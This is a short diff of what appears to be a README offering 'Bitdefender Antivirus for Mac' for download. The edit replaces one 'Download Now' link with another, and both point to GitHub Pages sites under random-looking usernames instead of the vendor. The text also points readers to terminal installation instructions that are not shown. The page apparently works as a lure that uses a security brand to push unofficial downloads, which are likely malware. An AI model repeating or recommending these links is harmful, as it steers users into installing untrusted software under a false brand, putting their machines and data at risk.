@@ -2,7 +2,7 @@
 
 Bitdefender Antivirus for Mac offers top-tier protection against malware, ransomware, and online threats. Follow the instructions below to securely download and install it on your Mac. 🛡️
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/bitdefender)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/bitdefender)
 
 If the download button doesn't work, follow the terminal installation instructions below.
 
